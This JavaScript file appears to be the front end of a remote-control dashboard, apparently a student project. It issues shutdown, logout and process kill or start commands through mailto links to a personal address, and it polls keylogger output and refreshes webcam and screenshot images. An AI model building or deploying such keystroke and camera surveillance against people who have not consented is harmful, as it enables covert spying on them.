const tags = document.querySelectorAll('.features > *');
const inputBoxes = document.querySelectorAll('.input-user > *');
const results = document.querySelectorAll('.show-result > *');
const requests = document.querySelectorAll('.send-request > *');

tags.forEach((tag, id) => {
    tag.addEventListener('click', () => {
        hideAllTags();
        hideAllInputBoxes();
        hideAllResults();
        hideAllRequests();

        tag.classList.add('active')
        inputBoxes[id].classList.add('choose') 
        results[id].classList.add('show') 
        requests[id].classList.add('select') 
    })
})
function hideAllTags() {
    tags.forEach(tag => tag.classList.remove('active'));
}
function hideAllInputBoxes() {
    inputBoxes.forEach(inputBox => inputBox.classList.remove('choose'));
}
function hideAllResults() {
    results.forEach(result => result.classList.remove('show'));
}
function hideAllRequests() {
    requests.forEach(request => request.classList.remove('select'));
}



const value = document.querySelector("#value");
const input = document.querySelector("#pi_input");
const using_opt = document.querySelector(".using");
const sd_lg = document.getElementById("sd_lg");
value.textContent = input.value;
input.addEventListener("input", (event) => {
    value.textContent = event.target.value;
    if (sd_lg.href.includes("Shutdown[")) {
        sd_lg.href = "mailto:nguyennam002004@gmail.com?subject=Shutdown%2FLogout&body=Shutdown[" + event.target.value + "]";
    }
    else if (sd_lg.href.includes("Logout[")) {
        sd_lg.href = "mailto:nguyennam002004@gmail.com?subject=Shutdown%2FLogout&body=Logout[" + event.target.value + "]";
    }
});


const opts = document.querySelectorAll(".opt > *");
opts.forEach((opt, id) => {
    opt.addEventListener("click", () => {
        hideAllOpts();
        opt.classList.add("using");
        if (sd_lg.href.includes("Shutdown[")) {
            sd_lg.href = sd_lg.href.replaceOverloaded("=Shutdown[", "=" + opt.textContent + "[");
        }
        else if (sd_lg.href.includes("Logout[")) {
            sd_lg.href = sd_lg.href.replaceOverloaded("=Logout[", "=" + opt.textContent + "[");
        }
    });
});
function hideAllOpts() {
    opts.forEach((opt) => opt.classList.remove("using"));
}
String.prototype.replaceOverloaded = function(searchValue, replaceValue) {
    if (arguments.length === 1) {
        return this.replace(new RegExp(searchValue, 'g'), '');
    } else {
        return this.replace(searchValue, replaceValue);
    }
};
  


const header = document.querySelector(".header");
const header_height = header.offsetHeight;
const main_box = document.querySelector(".main_box");

main_box.style.minHeight = `calc(100vh - ${header_height}px)`; 



const valuekl = document.querySelector("#valuekl");
const inputkl = document.querySelector("#pi_inputkl");
// const using_opt = document.querySelector(".using");
const klMail = document.getElementById("klMail");
valuekl.textContent = inputkl.value;
inputkl.addEventListener("input", (event) => {
    valuekl.textContent = event.target.value;

    klMail.href = "mailto:nguyennam002004@gmail.com?subject=Key%20logger&body=Time%5B" + event.target.value + "%5D";
});





//Code for key logger
setInterval(function() {
    fetch('/get-key-logger/')  // Use the appropriate URL here
        .then(response => response.json())
        .then(data => {
            // Update the HTML content with the fetched data
            let keyLoggerSpan = document.querySelector('#show-key-logger');
            keyLoggerSpan.innerHTML = `<strong>Key logger:</strong> ${data.key_logger}`;
        })
        .catch(error => {
            console.error('Error fetching data:', error);
        });
}, 5000);



//Code for applications
const tableListApps = document.getElementById("list-apps");

setInterval(function() {
    if (document.forms["search-app"].querySelector("input").value === "") {
        fetch("/get-list-apps/")
            .then(response => response.json())
            .then(data => {
                tableListApps.innerHTML = `
                    <tr>
                        <th>Id</th>
                        <th>Name</th>
                        <th>Thread</th>
                        <th>Send email</th>
                    </tr>
                `;
                JSON.parse(data.list_apps).forEach(item => {
                    const itemElement = document.createElement("tr");
                    itemElement.innerHTML = `
                        <td>${item.id}</td>
                        <td class="name">${item.name}</td>
                        <td>${item.thread}</td>
                        <td><a href="mailto:nguyennam002004@gmail.com?subject=Application%2FProcess&body=Kill%5Bname%3A${item.name}%5D%26%26List%20Application">Kill</a></td>
                    `;
                    tableListApps.appendChild(itemElement);                
                });
            })
            .catch(error => {
                console.log('Error fetching data:', error);
            });
    };
}, 5000);


//Code for processes
const tableListProcess = document.getElementById("list-processes");
setInterval(function() {
    if (document.forms["search-app"].querySelector("input").value === "") {
        fetch("/get-list-processes/")
            .then(response => response.json())
            .then(data => {
                tableListProcess.innerHTML = `
                    <tr>
                        <th>Id</th>
                        <th>Name</th>
                        <th>Thread</th>
                        <th>Send email</th>
                    </tr>
                `;
                JSON.parse(data.list_processes).forEach(item => {
                    const itemElement = document.createElement("tr");
                    itemElement.innerHTML = `
                        <td>${item.id}</td>
                        <td class="name">${item.name}</td>
                        <td>${item.thread}</td>
                        <td><a href="mailto:nguyennam002004@gmail.com?subject=Application%2FProcess&body=Kill%5Bname%3A${item.name}%5D%26%26List%20Process">Kill</a></td>
                    `;
                    tableListProcess.appendChild(itemElement);                
                });
            })
            .catch(error => {
                console.log('Error fetching data:', error);
            });
    };
}, 5000);


//Code for search
const searchBar = document.forms["search-app"].querySelector("input");
searchBar.addEventListener('keyup', e => {
    const term = e.target.value.toLowerCase();
    const items = document.querySelectorAll("#app-list > table > tr");
    items.forEach(item => {
        const name = item.querySelector(".name").textContent.toLowerCase();
        if(name.indexOf(term) != -1) {
            item.style.display = "table-row";
        } else {
            item.style.display = "none";
        }
    })
})


const webcam_image = document.getElementById("webcam-image");
const screenshot_image = document.getElementById("screenshot-image");

setInterval(function() {
    webcam_image.src=`/static/server/images/Webcam_image.png` + '?' + new Date().getTime();
    screenshot_image.src=`/static/server/images/Screenshot.png` + '?' + new Date().getTime();
}, 5000);


const openAppInput = document.getElementById("open-new-app-process");
const openAppBtn = document.querySelector("#add-app > a");
openAppInput.addEventListener("input", (event) => {
    const nameApp = event.target.value;
    openAppBtn.href = `mailto:nguyennam002004@gmail.com?subject=Application%2FProcess&body=Start%5Bname%3A${nameApp}%5D%26%26List%20Application`
});
